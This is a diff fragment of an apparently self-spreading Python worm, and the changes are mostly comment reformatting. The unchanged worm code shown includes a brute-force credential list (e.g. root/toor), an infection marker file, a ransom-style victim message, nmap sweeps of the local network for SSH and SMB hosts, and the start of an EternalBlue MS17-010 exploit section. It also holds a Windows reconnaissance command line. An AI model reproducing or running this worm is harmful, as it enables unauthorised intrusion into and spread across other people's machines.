@@ -47,9 +47,9 @@ whoami && dir C:\ && netsh firewall show portopening && reg query HKLM\Software\
 '''
 
 
-#########################################################################################################################################
+###########################################
 # The list of credentials to attempt
-#########################################################################################################################################
+###########################################
 
 credList = [
 ('hello1', 'world'),
@@ -60,9 +60,9 @@ credList = [
 ('root', 'toor'),
 ]
 
-#########################################################################################################################################
+###################################################
 # The file marking whether the worm has spread
-#########################################################################################################################################
+###################################################
 
 infectedMarkerFile = "/tmp/infected.txt"
 loopbackInterface = "lo"
@@ -70,25 +70,31 @@ wormMsg=  "BEWARE! YOU HAVE BEEN A VICTIM OF OPERATION BLUE KITTY"
 sc = ""
 numGroomConn = 0
 
-# Function to return network values such as default gateway, netmask, etc. related to a network interface
+##############################################################
+# Function to return network values such as default gateway, 
+# netmask, etc. related to a network interface
+# Retrieve and return the IP, network, 
+# cidr of the current network interface.
+# A system can have more than one address of the same type 
+# associated with each interface. 
+# But we are assuming that a interface doesn't have more 
+# than 1 address.
+##############################################################
 
 def network_values( interface ):
 
-	# Retrieve and return the IP, network, cidr of the current network interface.
-	# A system can have more than one address of the same type associated with each interface. But we are assuming that a interface doesn't have more than 1 address.
-
 	netiface = netifaces.ifaddresses( interface )[2][0]
-
-	ip = netiface['addr']	 											#Ref: https://www.programcreek.com/python/example/81895/netifaces.interfaces
+	ip = netiface['addr']	 							
 	broadcast = netiface['broadcast']
 	netmask=IPAddress(netiface['netmask'])
-	network = str(IPNetwork('%s/%s' % (ip, netmask)).network)			#Ref: https://stackoverflow.com/questions/3755863/trying-to-use-my-subnet-address-in-python-code
-	cidr = str(netmask.netmask_bits())									#Ref: https://stackoverflow.com/questions/38085571/how-use-netaddr-to-convert-subnet-mask-to-cidr-in-python
+	network = str(IPNetwork('%s/%s' % (ip, netmask)).network)			
+	cidr = str(netmask.netmask_bits())					        
 
 	'''
 	#Code to retrieve broadcast and default gateway
 
-	gateways =  netifaces.gateways()				# Get default gateway. Ref: https://cyruslab.net/2019/11/16/pythonnetifaces-module/
+	gateways =  netifaces.gateways()						
+	# Get default gateway
 	for i in range(len(gateways.get(2))):					
 		if gateways.get(2)[i][1] == interface:	
 			default_gateway = gateways.get(2)[i][0]
@@ -96,14 +102,20 @@ def network_values( interface ):
 
 	return ip, broadcast, network, cidr if not ip == "127.0.0.1" else None
 
-# Funtion to return Linux hosts running SSH Server (Port 22 Open)
+##################################################################
+# Function to return Linux hosts running SSH 
+# Server (Port 22 Open)
+##################################################################
 
 def getLinuxHostsOnTheSameNetwork(ip, broadcast, network, cidr):
 	portScanner = nmap.PortScanner()
 	portScanner.scan( network + "/" + cidr, arguments = '-p 22 --open --exclude ' + ip + ',' + broadcast)		#Ref: https://nmap.org/book/man-target-specification.html
 	return portScanner.all_hosts()
 
-# Funtion to return Windows hosts running SMB Service (Port 139,445 Open)
+################################################
+# Function to return Windows hosts running SMB 
+# Service (Port 139,445 Open)
+################################################
 
 def getWindowsHostsOnTheSameNetwork(ip, broadcast, network, cidr):
 	portScanner = nmap.PortScanner()
@@ -265,19 +277,14 @@ def find_file( file_name ):
 
 #####################################################################################################################################################################
 # Windows SMB Buffer Overflow SMB EternalBlue MS17-010 Exploit 
-#####################################################################################################################################################################
-
-####################################################################################################################################################################
-'''
-Bug detail:
-- For the buffer overflow bug detail
-- please see http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
-- The exploit also use other 2 bugs
-  - Send a large transaction with SMB_COM_NT_TRANSACT 
-  	but processed as SMB_COM_TRANSACTION2 (requires for trigger bug)
-  - Send special session setup command (SMB login command) 
-    to allocate big nonpaged pool (use for creating hole)
-'''
+# Bug detail:
+# For the buffer overflow bug detail
+# please see http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
+# The exploit also use other 2 bugs
+  # Send a large transaction with SMB_COM_NT_TRANSACT 
+  	# but processed as SMB_COM_TRANSACTION2 (requires for trigger bug)
+  # Send special session setup command (SMB login command) 
+	# to allocate big nonpaged pool (use for creating hole)
 #####################################################################################################################################################################
 def getNTStatus(self):
 	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
